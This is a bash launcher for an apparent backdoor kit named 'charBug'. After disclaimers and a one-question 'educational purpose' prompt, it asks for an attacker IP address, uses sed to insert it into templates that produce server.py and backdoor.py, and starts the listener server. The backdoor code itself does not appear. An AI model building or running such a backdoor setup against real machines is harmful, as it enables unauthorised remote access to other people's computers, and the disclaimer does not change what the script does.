#! /bin/bash
#checking avlaible tools

sudo apt install toilet figlet -y
toilet -f mono12 -F metal charBug

#colorBox
Red='\033[0;31m'
Green='\033[0;32m'
Cyan='\033[0;36m'
Yellow='\033[0;33m'
Nc='\033[0m'

echo -e "${Cyan}[!] Respect everyone's Privacy and Security"
echo "  "
echo -e "${Yellow}[!] Don't misuse this tool. Developer won't be responsible for any harm caused by this tool"
echo "  "
echo -e "${Green}[?] Do you want to use this tool for testing and educational purpose"
echo -e "${Yellow}  (1) for yes"
echo -e "${Yellow}  (2) for no"
read fair_use
if (( $fair_use == "1" ))
then 
    echo -e "${Green}[*] Enter ip address"
    read ppa
    sed "7 i polt='$ppa' " server.txt > server.py
    sed "11 i polt='$ppa' " backdoor.txt > backdoor.py
    echo ""
    sudo apt install python
    pip install termcolor
    chmod +x server.py
    python server.py
else
    echo "Access Denied !"
fi
